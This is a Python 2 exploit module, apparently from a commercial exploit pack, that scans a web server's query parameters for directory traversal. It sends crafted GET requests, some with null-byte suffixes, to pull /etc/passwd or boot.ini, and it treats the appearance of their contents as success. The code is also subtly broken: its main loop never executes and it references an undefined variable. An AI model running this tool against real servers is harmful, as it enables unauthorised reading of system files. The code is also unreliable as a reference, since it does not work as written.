#!/usr/bin/env python
# The exploit is a part of Agora pack - use only under the license agreement
# specified in LICENSE.txt in your Agora distribution

import sys
import socket

sys.path.append("./core")
from Sploit import Sploit
from DirectoryTraversal import DirTrav as DT

INFO={}
INFO["NAME"]="directory_traversal_scanner"
INFO["DESCRIPTION"]="Looking for directory traversal vulnerability in givven url"
INFO["VENDOR"]=""
INFO["CVE Name"]=""
INFO["NOTES"]="""
This scanner take all get parameters
And try exploit directory traversal vulnerability with each parameter
"""
INFO["CHANGELOG"]="01 April, 2016. Written by Gleg team."
INFO["PATH"] = "Utilities/"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = 80
OPTIONS["URL"] = "/"
OPTIONS["System"] = dict(options=["Windows", "GNU/Linux"], selected="GNU/Linux")
OPTIONS["DEPTH"] = 120


class exploit(Sploit):

    def __init__(self, host="127.0.0.1", port=80, depth=120,
     file_name="/etc/passwd", url="/", logger=None):
        Sploit.__init__(self,logger=logger)
        self.system = "Windows"
        self.host = host
        self.port = port
        self.depth = 120
        self.gets = []
        self.file_name = file_name
        self.url = url
        self.name=INFO['NAME']
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.depth = self.args.get("DEPTH", self.depth)
        self.url = self.args.get("URL", self.url)
        self.system = self.args.get("System", self.system)
        self.file_name = "/etc/passwd" if "GNU" in self.system else "boot.ini"
        return

    def find_all_get(self):
        if self.url.find("&") == -1:
            self.gets = []
            self.gets.append(self.url.split("?")[1].split("=")[0])
        elif self.url.find("?") == -1:
        	self.gets = ["/"]
        else:
            try:
                par = self.url.split("?")[1].split("&")
                self.gets = []
                for i in par:
                    self.gets.append(i.split("=")[0])
            except Exception,e:
                self.log(e)
                self.finish(0)
        self.url = self.url.split("?")[0]
        return

    def run(self):
        self.args()
        self.find_all_get()
        dir_trav = DT()
        n_b = 0
        while n_b >= 1:
            NB = "" if n_b == 0 else "%00"
            for g in self.gets:
                for now_path in dir_trav.xpath:
                    for i in xrange(0, self.depth):
                        fi = dir_trav.make_path(now_path, self.file_name, i)
                        fi = fi+NB if null_byte else fi
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        try:
                            s.connect((self.host, int(self.port)))
                        except:
                            self.log("Couldn't connect")
                            self.finish(False)
                        # create url GET /index.php?path=../../../ <-- just example
                        url = self.url + "?" + g + "=" + fi
                        pkt = "GET " + url + " HTTP/1.1\r\nHost: "
                        pkt += self.host+"\r\n\r\n"
                        s.send(pkt)
                        try:
                            data = s.recv(1024)
                        except:
                            self.log("Nothing recieved")
                            continue
                        if len(data) < 10: continue
                        if data.lower().find("error 404") > -1: continue
                        if data.lower().find("404 resource not found") > -1: continue
                        if data.lower().find("http/1.1 301") > -1: continue
                        if data.lower().find("404 not found") > -1: continue
                        if data.lower().find("400 bad request") > -1: continue
                        if data.lower().find("400 error") > -1: continue
                        if data.lower().find("403 forbidden") > -1: continue
                        if data.lower().find("no such file or directory") > -1: continue
                        if data.lower().find("root:x:0:0:root:") > -1:
                            self.log(data)
                            self.log("Using this url: " + url)
                            self.finish(True)
                        elif data.lower().find("[boot loader]") > -1:
                            self.log(data)
                            self.log("Using this url: " + url)
                            self.finish(True)
                        else:
                            continue
            n_b += 1
        self.log("Done. Nothing find")
        self.finish(False)
        return 1

if __name__ == '__main__':
    print ("Running exploit %s .. " % INFO['NAME'])
    e = exploit("localhost")
    e.run()